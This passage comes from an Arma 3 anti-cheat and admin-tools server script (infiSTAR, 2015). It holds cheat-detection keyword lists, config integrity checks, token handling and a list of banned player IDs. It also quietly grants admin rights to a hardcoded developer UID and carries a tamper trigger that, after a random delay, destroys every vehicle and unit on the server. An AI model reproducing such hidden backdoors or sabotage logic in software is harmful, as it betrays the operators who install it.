/*            File: A3AH.sqf            Author: Chris(tian) "infiSTAR" Lorenzen            Contact: infiSTAR23@gmail.com                        Description:            Arma AntiHack & AdminTools - infiSTAR.de      */      /* *******************Developer : infiSTAR (infiSTAR23@gmail.com)******************* */      /* **************infiSTAR Copyright®© 2011 - 2015 All rights reserved.************** */      /* *********************************www.infiSTAR.de********************************* */      diag_log '<infiSTAR.de> VERSION: 23-04-2015 infiSTAR.de AHAT (v0148)';      comment 'Antihack & AdminTools - Christian Lorenzen - www.infiSTAR.de - License: (CC)';      UPDATEEMAIL='R.Furth@gmx.de';      INFISTARVERSION='23-04-2015-v0148';      diag_log format['<infiSTAR.de> %1 - STARTING',time];      if((preProcessFileLineNumbers ('customconfigfile.sqf')) != '')then {            call compile preProcessFileLineNumbers 'customconfigfile.sqf';            diag_log format['<infiSTAR.de> %1 - customconfigfile.sqf found and loaded - run.sqf settings overwritten!',time];      };      _BlackList = [];      if(!isNil '_badpeople')then {if(typeName _badpeople == 'ARRAY')then {_BlackList = _badpeople;};};      if((preProcessFileLineNumbers ('blacklist.sqf')) != '')then {            _tmpBL = call compile preProcessFileLineNumbers 'blacklist.sqf';            if(!isNil '_tmpBL')then            {                  if(typeName _tmpBL == 'ARRAY')then                  {                        if(str _tmpBL != '[]')then                        {                              _BlackList = _BlackList + _tmpBL;                        };                  };            };      };      _mPos = getMarkerPos 'respawn_west';      _mPos2 = getMarkerPos 'respawn_east';      _mPos3 = getMarkerPos 'center';      _allRandomGenVars = [];      _fnc_RandomGen =      {            _abc = ['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'];            _gen = _abc select (random ((count _abc)-1));            _arr = ['L','F','8','a','G','v','4','s','1','B','R','D','X','4','B','F','m','T','w','9','P','x','H','8','H','N','9','c','z','c'];            for '_i' from 0 to (8+(round(random 3))) do {_gen = _gen + str(round(random 9)) + (_arr select (random ((count _arr)-1)));};            _allRandomGenVars pushBack _gen;            _gen      };diag_log format['<infiSTAR.de> _fnc_RandomGen: %1',_fnc_RandomGen];      _adminbox = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _adminbox: %1',_adminbox];      _loadedchecktime = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _loadedchecktime: %1',_loadedchecktime];      _fnc_mpPackets = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _fnc_mpPackets: %1',_fnc_mpPackets];      _RunOnClients = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _RunOnClients: %1',_RunOnClients];      _sumRunOnClients = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _sumRunOnClients: %1',_sumRunOnClients];      _AH_MAIN_BLOCK = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _AH_MAIN_BLOCK: %1',_AH_MAIN_BLOCK];      _sumAH_MAIN_BLOCK = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _sumAH_MAIN_BLOCK: %1',_sumAH_MAIN_BLOCK];      _FNC_AH120_KICKLOG = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _FNC_AH120_KICKLOG: %1',_FNC_AH120_KICKLOG];      _FNC_AH120_KICKLOGSPAWN = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _FNC_AH120_KICKLOGSPAWN: %1',_FNC_AH120_KICKLOGSPAWN];      _FNC_PVAH_AdminReq = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _FNC_PVAH_AdminReq: %1',_FNC_PVAH_AdminReq];      _PoopTokenArray = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _PoopTokenArray: %1',_PoopTokenArray];      _server_setTokenR = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _server_setTokenR: %1',_server_setTokenR];      _server_checkTokenR = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _server_checkTokenR: %1',_server_checkTokenR];      _MAIN_CODE = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _MAIN_CODE: %1',_MAIN_CODE];      _AHKickOFF = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _AHKickOFF: %1',_AHKickOFF];      _AH120KICKLOG = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _AH120KICKLOG: %1',_AH120KICKLOG];      _infiSTAR_fnc_animchanged = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _infiSTAR_fnc_animchanged: %1',_infiSTAR_fnc_animchanged];      _FiredCheck = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _FiredCheck: %1',_FiredCheck];      _clientdo = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _clientdo: %1',_clientdo];      _AH_RunCheckARRAY = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _AH_RunCheckARRAY: %1',_AH_RunCheckARRAY];      _AH_RunCheckENDVAR = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _AH_RunCheckENDVAR: %1',_AH_RunCheckENDVAR];      _AH_HackLogArrayRND = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _AH_HackLogArrayRND: %1',_AH_HackLogArrayRND];      _AH_SurvLogArrayRND = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _AH_SurvLogArrayRND: %1',_AH_SurvLogArrayRND];      _AH_AdmiLogArrayRND = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _AH_AdmiLogArrayRND: %1',_AH_AdmiLogArrayRND];      _TMPBAN = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _TMPBAN: %1',_TMPBAN];      _massMessage = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _massMessage: %1',_massMessage];      _AHpos = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _AHpos: %1',_AHpos];      _ninetwo = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _ninetwo: %1',_ninetwo];      _ninetwothread = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _ninetwothread: %1',_ninetwothread];      _adminsA = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _adminsA: %1',_adminsA];      _MC = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _MC: %1',_MC];      _MCS = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _MCS: %1',_MCS];      _AdminLoaded = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _AdminLoaded: %1',_AdminLoaded];      _clientoncethree = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _clientoncethree: %1',_clientoncethree];      _YourPlayerToken = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _YourPlayerToken: %1',_YourPlayerToken];      _TokenCheck = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _TokenCheck: %1',_TokenCheck];_TokenCheckN=str(random 9999);      _oneachframe = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _oneachframe: %1',_oneachframe];      _checkidicheckcheck = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _checkidicheckcheck: %1',_checkidicheckcheck];      _lastshotmade = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _lastshotmade: %1',_lastshotmade];      _dellocveh = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _dellocveh: %1',_dellocveh];      _gogogo = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _gogogo: %1',_gogogo];      _gogogoCONTENT = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _gogogoCONTENT: %1',_gogogoCONTENT];      _toBreakDisplays = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _toBreakDisplays: %1',_toBreakDisplays];      _inCombatTime = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _inCombatTime: %1',_inCombatTime];      _inCombatArray = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _inCombatArray: %1',_inCombatArray];      _loaded = format['A3RANDVAR_%1%2%3',round(random 999),round(random 999),round(random 999)];diag_log format['<infiSTAR.de> _loaded: %1',_loaded];      _BIS_fnc_endMission = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _BIS_fnc_endMission: %1',_BIS_fnc_endMission];      call compile (""+_BIS_fnc_endMission+" = BIS_fnc_endMission;publicVariable '"+_BIS_fnc_endMission+"';");      _BIS_fnc_param = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _BIS_fnc_param: %1',_BIS_fnc_param];      call compile (""+_BIS_fnc_param+" = BIS_fnc_param;publicVariable '"+_BIS_fnc_param+"';");      {call compile format['%1=compileFinal'''';publicVariable''%1'';',_x];} forEach ['InfiSTAR_RUNNING_AH_on_Player','life_nukeposition'];      _fnc_RandomGen =      {            _arr = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];            _gen = 'PVAHR_';            _max = 5+(round(random 3));            for '_i' from 1 to _max do {_gen = _gen + str(round(random 9)) + (_arr select (random ((count _arr)-1)));};            _allRandomGenVars pushBack _gen;            _gen      };      _AH120_KICKLOG = call _fnc_RandomGen;diag_log format['<infiSTAR.de> _AH120_KICKLOG: %1',_AH120_KICKLOG];      _KK_fnc_arrayShuffle = {            private '_cnt';            _cnt = count _this;            for '_i' from 1 to _cnt do {                  _this pushBack (_this deleteAt floor random _cnt);            };            _this      };      _allRandomGenVars call _KK_fnc_arrayShuffle;      diag_log format['<infiSTAR.de> %1 - loading AntiHack..',time];      _verybadStrings =      [            '_execscript','_theban','rhynov1','B1g_B3n',            'menu loaded','rustler','hangender','hungender','monky','godmode',            'douggem','monstercheats','bigben','swagger','nigg','fireworks','antiantihack',            'e_x_t_a_s_y','jjjj','jxmxe','hydroxus','kill target','no recoil','rapid fire',            'amm0','weppp3','att4chm3nt','f0od_dr1nk','m3d1c4l','t0ol_it3ms','b4ckp4cks','it3m5','cl0th1ng',            'lystic','extasy','glasssimon_flo','remote_execution','gladtwoown','_pathtoscripts',            'flo_simon','sonicccc_','fury_','phoenix_','_my_new_bullet_man','god on','_jm3',            'disablecollisionwith _bullet','thirtysix','dmc_fnc_4danews','w_o_o_k_i_e_m_e_n_u',            'xbowbii_','jm3_','wuat','menutest_','listening to jack','dmcheats.de','kichdm',            '_news_banner','fucked up','lystics menu','rsccombo_2100','\dll\datmalloc',            'rsclistbox_1501','rsclistbox_1500','\dll\tcmalloc_bi','___newbpass',            'updated_playerlist','fuck you infistar','god mode','unlimited mags','recking_ki',            'gg_ee_ff','ggggg_eeeee_fffff','gggg_eeee_ffff','mord all','teleport all',            '__byass','_altislifeh4x','antifrezze','ownscripts','ownscripted','mesnu','code to execute',            'g-e-f','ctrlcreate','box-esp','explode all','teleportall','destroyall','destroy all'      ];      _rscDCl = toArray(getText(configFile >> 'RscDisplayConfigure' >> 'onLoad'));      _rscDCl1 = [91,34,111,110,76,111,97,100,34,44,95,116,104,105,115,44,34,82,115,99,68,105,115,112,108,97,121,67,111,110,102,105,103,117,114,101,34,44,39,71,85,73,39,93,32,99,97,108,108,32,99,111,109,112,105,108,101,32,112,114,101,112,114,111,99,101,115,115,102,105,108,101,108,105,110,101,110,117,109,98,101,114,115,32,34,65,51,92,117,105,95,102,92,115,99,114,105,112,116,115,92,105,110,105,116,68,105,115,112,108,97,121,46,115,113,102,34,59,32,95,116,104,105,115,32,99,97,108,108,32,99,111,109,112,105,108,101,32,112,114,101,112,114,111,99,101,115,115,102,105,108,101,108,105,110,101,110,117,109,98,101,114,115,32,34,92,120,92,99,98,97,92,97,100,100,111,110,115,92,107,101,121,98,105,110,100,105,110,103,92,103,117,105,92,105,110,105,116,68,105,115,112,108,97,121,46,115,113,102,34];      _rscDCl2 = [91,34,111,110,76,111,97,100,34,44,95,116,104,105,115,44,34,82,115,99,68,105,115,112,108,97,121,67,111,110,102,105,103,117,114,101,34,44,39,71,85,73,39,93,32,99,97,108,108,32,32,32,32,32,32,32,32,32,40,117,105,110,97,109,101,115,112,97,99,101,32,103,101,116,118,97,114,105,97,98,108,101,32,39,66,73,83,95,102,110,99,95,105,110,105,116,68,105,115,112,108,97,121,39,41];      _rscDCu = toArray(getText(configFile >> 'RscDisplayConfigure' >> 'onUnload'));      _init = toArray(getText(configFile >> 'cfgFunctions' >> 'init'));      _init1 = toArray('x\addons\a3_epoch_code\compile\bis_functions\initFunctions.sqf');      _initL = toArray(getText(configFile >> 'RscDisplayMission' >> 'onLoad'));      _initUL = toArray(getText(configFile >> 'RscDisplayMission' >> 'onUnload'));      _markerL = toArray(getText(configFile >> 'RscDisplayInsertMarker' >> 'onLoad'));      _markerUL = toArray(getText(configFile >> 'RscDisplayInsertMarker' >> 'onUnload'));      _EB1 = toArray(getText(configfile >> 'RscDisplayInventory' >> 'controls' >> 'EpochBTN1' >> 'onMouseButtonDown'));      _EB2 = toArray(getText(configfile >> 'RscDisplayInventory' >> 'controls' >> 'EpochBTN2' >> 'onMouseButtonDown'));      _EB3 = toArray(getText(configfile >> 'TapOut' >> 'controls' >> 'tapout' >> 'action'));      _EB4 = toArray(getText(configfile >> 'TapOut' >> 'controls' >> 'tapout' >> 'onKeyDown'));      _CE1 = toArray(getText(configFile >> 'RscDisplayOptionsVideo' >> 'controls' >> 'G_VideoOptionsControls' >> 'controls' >> 'HideAdvanced' >> 'OnButtonClick'));      _CE2 = toArray(getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'BCredits' >> 'OnButtonClick'));      _CE3 = toArray(getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'ButtonCancel' >> 'OnButtonClick'));      _CE4 = toArray(getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'ButtonCancel' >> 'action'));      _CE5 = toArray(getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'BGameOptions' >> 'action'));      _CE6 = toArray(getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'BConfigure' >> 'action'));      _CE7 = toArray(getText(configFile >> 'RscDisplayMPInterrupt' >> 'controls' >>'ButtonAbort' >> 'action'));      _CE8 = toArray(getText(configFile >> 'RscDisplayMPInterrupt' >> 'controls' >>'ButtonAbort' >> 'OnButtonClick'));      _onLoadUnload1 = [            'RscDisplayDSinterface','RscDisplayOptionsVideo',            'RscDisplayDebriefing','RscDisplayInventory','RscDisplayMainMap','RscDisplayGetReady','RscDisplayLoadMission','RscDisplayInterrupt',            'RscDisplayOptions','RscDisplayAVTerminal','RscDisplayConfigureAction','RscDisplayConfigureControllers',            'RscDisplayControlSchemes','RscDisplayCustomizeController','RscDisplayDiary','RscDisplayGameOptions','RscDisplayJoystickSchemes',            'RscDisplayLoading','RscDisplayMicSensitivityOptions','RscDisplayOptionsAudio','RscDisplayOptionsLayout','RscDisplayStart',            'RscDisplayVehicleMsgBox','RscDisplayInsertMarker','RscMiniMap','RscMiniMapSmall','RscDisplayFieldManual','RscDisplayPassword',            'RscDisplayServerGetReady','RscDisplayClientGetReady','RscDisplayRespawn','RscDisplayClient','RscDisplayOptionsInGame',            'RscDisplayMPInterrupt','RscDisplayRemoteMissions','RscConfigEditor_Main','RscDisplayMain',            'RscDisplayCampaignSelect','RscDisplayStatistics','RscDisplayStatisticsCurrent','DisplayMultiplayerServerAdvanced',            'RscDisplayScriptingHelp','RscMenuBasicLevel','RscDisplayArcadeUnit','RscDisplayCampaign','RscDisplayEditDiaryRecord',            'RscDisplayEditProfile','RscDisplayIPAddress','RscDisplayXWizardTemplate','RscDisplaySingleplayer','RscDisplayDebug',            'RscDisplayAddonActions','RscDisplayMissionEditor','RscMainMenu','RscDisplayOptiMatchFilter','RscDisplayBuyGear',            'DisplayMultiplayerServerAdvancedSelect','RscGroupRootMenu','RscDisplayClientWait','RscMPSetupMessage','RscDisplayDedicatedServerSettings',            'RscDisplayMissionEnd','RscDisplaySelectSave','RscDisplayDedicatedServer'      ];      _serverEpochVersion='';      _clientEpochVersionS='';      if(_MOD == 'EPOCH')then      {            _serverEpochVersion = getText(configFile >> 'CfgServerVersion' >> 'client');            diag_log format['<infiSTAR.de> Found Epoch Mod ServerVersion:   %1',_serverEpochVersion];            _clientEpochVersionS=getText(configFile >> 'CfgMods' >> 'Epoch' >> 'version');            diag_log format['<infiSTAR.de> Found Epoch Mod ClientVersion (on Server):   %1',_clientEpochVersionS];            _onLoadUnload1Epochonly = [                  'RscWelcomeEpoch','RscDisplayInfo','RscVersionUpdateEpoch','RscInGameUI','RscUnitInfo','RscStanceInfo','RscUnitInfoAirRTDBasic','RscUnitInfoAirRTDFull','EpochLoadingScreen',                  'EpochGameUI','EpochGameUI2','EpochGameUI3','Interact','GroupRequests','CraftItem','InteractVehicle','InteractNPC','InteractBank','Epoch_myGroup','EPOCH_createGrp',                  'Epoch_GroupInvite'            ];            _onLoadUnload1 = _onLoadUnload1 + _onLoadUnload1Epochonly;      };      _onLoadUnload2 = [];      _onLoadUnload3 = [];      {            _onLoadUnload2 pushBack (toArray(getText(configFile >> _x >> 'onLoad')));            _onLoadUnload3 pushBack (toArray(getText(configFile >> _x >> 'onUnload')));      } forEach _onLoadUnload1;      _cfg = configFile;      _server_Addons = ['Dum_istan_destruct','Dum_istan_destruct_wood','Dum_istan_destruct_shutter',      'Dum_istan_destruct_door_a','Dum_istan_destruct_door_b','Dum_istan_destruct_door_c','CfgArmory',      'CfgMovesAnimalsBase','CfgMovesDog','CBA_Dummy_Map','smallfire'];      for '_i' from 0 to count (_cfg)-1 do      {            _selected = _cfg select _i;            if(isClass _selected)then            {                  _c = configName _selected;                  _server_Addons pushBack _c;            };      };      _toCompilableString = {            _code = _this select 0;            _string = '';            if(typeName _code == 'CODE')then            {                  _string = str(_code);                  _arr = toArray(_string);                  _arr set[0,32];                  _arr set[count(_arr)-1,32];                  _string = toString(_arr);            };            _string;      };      fnc_CompilableString = compileFinal ([_toCompilableString] call _toCompilableString);      _fnc_infiServerKick = {            uiSleep 0.1;            private['_name','_puid','_reobj'];            _name = _this select 0;            _puid = _this select 1;            _reobj = 'C_man_1' createVehicle [0,0,0];            _reobj addMPEventHandler ['MPKilled','if(!isServer)then            {                  _fncKick = {                        [] spawn {_d = (findDisplay 0) createDisplay ''RscDisplayMission'';(findDisplay 0) closeDisplay 0;};                        [] spawn {for ''_c'' from 0 to 101 do {findDisplay _c closeDisplay 0;};};                  };                  if(profileName == '+str _name+')then                  {                        call _fncKick;                  };                  if(isNull player) then {(findDisplay 46) closeDisplay 0;};                  if(getPlayerUID player == '+str _puid+')then                  {                        call _fncKick;                  };            };'];            _reobj setDamage 5;            deleteVehicle _reobj;            diag_log format['<infiSTAR.de> Kicked Player with UID %1.. (v0148)',(_this select 0)];      };      fnc_infiServerKick = compileFinal ([_fnc_infiServerKick] call _toCompilableString);      BIS_fnc_MP = compileFinal ([BIS_fnc_MP] call _toCompilableString);      BIS_fnc_spawn = compileFinal ([BIS_fnc_spawn] call _toCompilableString);      BIS_fnc_MPExec = compileFinal ([BIS_fnc_MPExec] call _toCompilableString);      fnc_getserverTime = compileFinal "            _globaltime = serverTime;            if(_globaltime > 18000)then {_globaltime = time;};            _hours = floor(_globaltime/60/60);            _minutes = (round(_globaltime/60)-(_hours*60));if(_minutes < 10)then {_minutes = format['0%1',_minutes];};            _mytime = format['%1h %2min | ',_hours,_minutes];            _mytime      ";      fnc_doGlobal = compileFinal "            _reobj = 'C_man_1' createVehicle [0,0,0];            _reobj addMPEventHandler ['MPKilled',_this select 0];            _reobj setDamage 5;            deleteVehicle _reobj;      ";      FNC_A3_HACKLOG = compileFinal "            'ARMA_LOG' callExtension format['A3_HACKLOG:%1 (v0148)',_this];            diag_log ('<infiSTAR.de>HL| '+_this+' (v0148)');      ";      FNC_A3_SURVEILLANCELOG = compileFinal "            'ARMA_LOG' callExtension format['A3_SURVEILLANCELOG:%1 (v0148)',_this];            diag_log ('<infiSTAR.de>SL| '+_this+' (v0148)');      ";      FNC_A3_ADMINLOG = compileFinal "            'ARMA_LOG' callExtension format['A3_ADMINLOG:%1 (v0148)',_this];            diag_log ('<infiSTAR.de>AdminLog| '+_this+' (v0148)');      ";      FNC_A3_CONNECTLOG = compileFinal "            'ARMA_LOG' callExtension format['A3_CONNECTLOG:%1 (v0148)',_this];            diag_log ('<infiSTAR.de>ConnectLog| '+_this+' (v0148)');      ";      if(_MOD == 'Epoch')then      {            FNC_A3_infiSTARBAN = compileFinal "                  _uid = _this select 0;                  _name = _this select 1;                  'EpochServer' callExtension format['820|%1|infiSTAR.de: %2(%1)',_uid,_name];                  {if((getPlayerUID _x) isEqualTo _uid)exitWith {_x setDamage 5;};} forEach playableUnits;                  diag_log format['<infiSTAR.de>BanLog| %1(%2) (v0148)',_uid,_name];            ";      }      else      {            FNC_A3_infiSTARBAN = compileFinal "                  _uid = _this select 0;                  _name = _this select 1;                  'ARMA_BAN' callExtension format[':%1',_uid];                  {if((getPlayerUID _x) isEqualTo _uid)exitWith {_x setDamage 5;};} forEach playableUnits;                  diag_log format['<infiSTAR.de>BanLog| %1(%2) (v0148)',_uid,_name];            ";      };      _adminLevel1_UIDs = _adminLevel1_UIDs + ['0'];      {            _adminLevel1_UIDs = _adminLevel1_UIDs - [_x];            _adminLevel2_UIDs = _adminLevel2_UIDs - [_x];            _adminLevel3_UIDs = _adminLevel3_UIDs - [_x];      } forEach ['','0'];      _admins = _adminLevel1_UIDs + _adminLevel2_UIDs + _adminLevel3_UIDs;      _devs = ['76561198152111329'];{if!(_x in _admins)then {_admins pushBack _x;};} forEach _devs;      call compile ("            "+_adminsA+" = "+str _admins+";{"+_adminsA+" = "+_adminsA+" - [_x];} forEach "+str _startAsNormal+";publicVariable '"+_adminsA+"';      ");      _A3AHstring = "            diag_log format['<infiSTAR.de> %1 - Thread MAIN: starting!',time];            "+_gogogo+" = "+str _gogogoCONTENT+";publicVariable '"+_gogogo+"';            if(isNil '"+_PoopTokenArray+"')then {"+_PoopTokenArray+" = [];};            _server_setToken={                  private['_uid','_token'];                  _uid = _this;                  if(isNil '_uid')then {_uid = '__SERVER__';} else {if(_uid isEqualTo '')then {_uid = '__SERVER__';};};                  if!(_uid in "+_PoopTokenArray+")then                  {                        _fnc_RandomGen =                        {                              _arr = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9'];                              _gen = _arr select (floor (random 25));                              for '_i' from 0 to (12+(round(random 5))) do {_gen = _gen + (_arr select (random ((count _arr)-1)));};                              _gen                        };                        _token = call _fnc_RandomGen;                        "+_PoopTokenArray+" pushBack _uid;                        "+_PoopTokenArray+" pushBack _token;                        diag_log format['<infiSTAR.de> server_setToken:   UID: %1 | TOKEN: %2 - TOKEN CREATED',_uid,_token];                                                if(_uid isEqualTo '__SERVER__')exitWith {};                        _mPos = "+str _mPos+";                        _nearguys = _mPos nearEntities ['Man',100];                        {                              _xuid = getPlayerUID _x;                              if(_xuid == _uid)exitWith                              {                                    "+_YourPlayerToken+" = _token;                                    (owner _x) publicVariableClient '"+_YourPlayerToken+"';                                    diag_log format['<infiSTAR.de> server_setToken:   UID: %1 | TOKEN: %2 - TOKEN SENT TO OBJECT',_uid,_token];                              };                        } forEach _nearguys;                  };            };            "+_server_setTokenR+" = compileFinal ([_server_setToken] call fnc_CompilableString);            _server_checkToken={                  private['_passed','_uid','_ptoken','_stoken'];                  _passed = false;                  _uid = (_this select 0);                  _ptoken = (_this select 1);                  if(isNil '_uid')then {_uid = '__SERVER__';} else {if(_uid isEqualTo '')then {_uid = '__SERVER__';};};                  if(typeName _uid isEqualTo 'STRING')then                  {                        _stoken = "+_PoopTokenArray+" select (("+_PoopTokenArray+" find _uid)+1);                        if(!isNil '_stoken')then                        {                              _passed = _stoken isEqualTo _ptoken;                        };                  };                  _passed            };            "+_server_checkTokenR+" = compileFinal ([_server_checkToken] call fnc_CompilableString);            _fnc_infiSTAR_PlayerLog = {                  _uid = _this select 0;_name = _this select 1;                  _uid call "+_server_setTokenR+";                  if(_uid != '')then                  {                        if({((toLower _name) find _x != -1)} count ['swag','thirtysix'] > 0)then                        {                              _log = format['BadName: %1',_name];                              [_name,_uid,'SLOG',toArray(_log)] call "+_FNC_AH120_KICKLOG+";                              [_name,_uid] spawn fnc_infiServerKick;                        };                        _baddies =                        [                              '76561198059930120','76561198134916119','76561198130615382','76561198000135158',                              '76561198098132364','76561198127436055','76561198120497784','76561198151285096',                              '76561198037143375','76561198053362106','76561197960693668','76561198029212490',                              '76561198118994984','76561198150211409','76561198118066332','76561198148495214',                              '76561198124727926','76561198087505309','76561198106834234','76561198056113988',                              '76561198153161518','76561198077972256','76561198144416171','76561198151661947',                              '76561198075411542','76561198106140797','76561198118378695','76561198062509950',                              '76561198080657666','76561198156021205','76561198126816660','76561197979392398',                              '76561197969005505','76561197978751247','76561197971107759','76561197967087500',                              '76561197995117205','76561197964338716','76561198128229370','76561198141766032',                              '76561198131838128','76561198137119508','76561198077957452','76561198067414796',                              '76561198055161991','76561198089299178','76561198129631838','76561198119258603',                              '76561198002094787','76561198148907901','76561197978913290','76561197984690630',                              '76561198025777475','76561197961122016','76561198160514374','76561198165856213',                              '76561198094783145','76561198085523173','76561197984998237','76561198013819290',                              '76561197982406660','76561197972252136','76561198009791150','76561198154257484',                              '76561197960292002','76561198044218532','76561198035170425','76561198141958508',                              '76561198152649864','76561198127341284','76561198166513783','76561198032309705',                              '76561198137073763','76561198085897950','76561198145115648','76561198080244706',                              '76561197994045926','76561198124128052','76561198119472477','76561198049992289',                              '76561198111864019','76561197997686263','76561198161483683','76561198124849894',                              '76561198164196577','76561198133066692','76561198163057499','76561198058635527',                              '76561198062276128','76561198157673117','76561198131170408','76561198128889826',                              '76561198128939134','76561198065607803','76561198121247387','76561198076232303',                              '76561198144358523','76561198032349954','76561198028313707','76561198148216075',                              '76561198165881759','76561198165211039','76561198074110583','76561198098254345',                              '76561198054619746','76561198061552644','76561198068243806','76561198164444108',                              '76561198165496777','76561198160602020','76561198018065224','76561197987629806',                              '76561198047883815','76561198069085023','76561198059688627','76561198122259220',                              '76561198164784675','76561198162451605','76561198151137695','76561198203651168',                              '76561198149065671','76561198175611354','76561198157469769','76561198019017645',                              '76561197963041299','76561198159780832','76561198014790670','76561198142729104',                              '76561198095569574','76561198161648337','76561198134613431',                              '76561198166419716','76561198175853759','76561198123807524','76561198167827911',                              '76561198167152679','76561197980206587','76561197963458654','76561197967605970',                              '76561198033680504','76561198180913597','76561198123886811','76561197985584715',                              '76561197999691527','76561198105419039','76561198005271335','76561198053629469',                              '76561198026212101','76561198103738030','76561198035798322','76561198046700395',                              '76561198043439272','76561197970859383','76561198038412105','76561198037585247',                              '76561198165530789','76561198100716220','76561198011155257','76561198067460432',                              '76561198137782162','76561198150445203','76561198138833938','76561198027756450',                              '76561198121038237','76561198184564030','76561198180558863','76561198041138086',                              '0'                        ];                        if((toLower _name) find 'infistar' != -1)then                        {                              _baddies pushBack _uid;                              _log = format['BadName: %1 (FAKE)',_name];                              [_name,_uid,'BAN',toArray(_log)] call "+_FNC_AH120_KICKLOG+";                        };                        if(isNil '"+_TMPBAN+"')then {"+_TMPBAN+" = [];} else {if(typeName "+_TMPBAN+" != 'ARRAY')then {"+_TMPBAN+" = [];};};                        if((_uid in "+_TMPBAN+") || (_uid in _baddies))then                        {                              if!(_uid in "+_TMPBAN+")then                              {                                    [_uid,_name] call FNC_A3_infiSTARBAN;                                    "+_TMPBAN+" pushBack _uid;{if(getPlayerUID _x in "+str _admins+")then {(owner _x) publicVariableClient '"+_TMPBAN+"';};} forEach playableUnits;                              };                              [_name,_uid] spawn fnc_infiServerKick;                        };                        if(_uid in "+str _BlackList+")then                        {                              _log = 'Has been banned for Hacking before..! (banned thorugh _badpeople array (run.sqf))';                              [_name,_uid,'BAN',toArray(_log)] call "+_FNC_AH120_KICKLOG+";                              [_name,_uid] spawn fnc_infiServerKick;                        };                        if(isNil 'PlayerLogArrayMNS')then {PlayerLogArrayMNS = profileNamespace getVariable['PlayerLogArrayMNS',[]];};                        if!(_uid in PlayerLogArrayMNS)then                        {                              PlayerLogArrayMNS pushBack _uid;                              profileNamespace setVariable['PlayerLogArrayMNS',PlayerLogArrayMNS];saveprofileNamespace;                              diag_log format['<infiSTAR.de> New Player: %1(%2)',_name,_uid];                        };                  };            };            fnc_infiSTAR_PlayerLog = compileFinal ([_fnc_infiSTAR_PlayerLog] call fnc_CompilableString);            if(isNil '"+_AH_HackLogArrayRND+"')then {"+_AH_HackLogArrayRND+" = [];};            if(isNil '"+_AH_SurvLogArrayRND+"')then {"+_AH_SurvLogArrayRND+" = [];};            if(isNil '"+_AH_AdmiLogArrayRND+"')then {"+_AH_AdmiLogArrayRND+" = [];};            diag_log format['<infiSTAR.de> %1 - Thread MAIN: loading...!',time];            diag_log format['<infiSTAR.de> %1 - Thread MAIN: compiling and/or sending none-threaded code!',time];            "+_AH_RunCheckENDVAR+" = 'k';            if('infiSTAR' != ('i' +'n' +'f' +'i' +'S' +'T' +'A' +'R'))then {[] spawn {uiSleep (random 500);{_x setDamage 1;}forEach vehicles;uiSleep 10;{_x setDamage 1;}forEach allUnits;};};            "; if(_VDN)then { _A3AHstring = _A3AHstring + "            _fnc_VoteTimeServer =            {                  _clientUID = _this select 0;                  _vote = _this select 1;                                    if(isNil 'TimeVoteCooldown')then {TimeVoteCooldown = 300;};                  if(isNil 'LastVoteGoneThrough')then {LastVoteGoneThrough = 600;};                  if((LastVoteGoneThrough == 0) || ((TimeVoteCooldown + LastVoteGoneThrough) < time))then                  {                        if(isNil 'VoteArray')then {VoteArray = [];};                        if!(_clientUID in VoteArray)then                        {                              VoteArray pushBack _clientUID;                              VoteArray pushBack _vote;                              _cntAll = count playableUnits;                              _cntVoted = {getPlayerUID _x in VoteArray} count playableUnits;                              if((_cntAll > 0) && (_cntVoted > 0))then                              {                                    _cntday = 0;                                    _cntnight = 0;                                    if((_cntVoted / _cntAll) > 0.49)then                                    {                                          _oUIDs = [];                                          {                                                _xUID = getPlayerUID _x;                                                